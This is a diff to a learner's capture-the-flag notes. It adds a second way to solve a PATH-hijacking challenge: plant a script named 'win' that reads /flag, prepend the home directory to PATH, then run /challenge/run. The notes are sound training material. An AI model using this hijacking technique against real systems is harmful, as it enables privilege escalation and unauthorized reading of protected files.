@@ -6,6 +6,7 @@
 ---
 
 ## ✅ what i did  
+1° WAY -> set a new value of the PATH
 -clicked start
 -opened the terminal
 -ran: 'which cat'
@@ -14,6 +15,19 @@
 -pasted the path into win and added /flag -> '/bin/cat /flag'
 -ran: 'chmod a+x win'
 -ran: 'PATH=/home/hacker'
+-ran: '/challenge/run'
+-flag popped out
+
+2° WAY -> adding a new value to the PATH
+-clicked start
+-opened the terminal
+-ran: 'vim win'
+-typed: 'cat /flag'
+-ran: 'chmod a+x win'
+-ran: 'echo $PATH'
+-copied the full value -> '/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+-adding '/home/hacker' to the PATH
+-ran: 'PATH=/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 -ran: '/challenge/run'
 -flag popped out
 
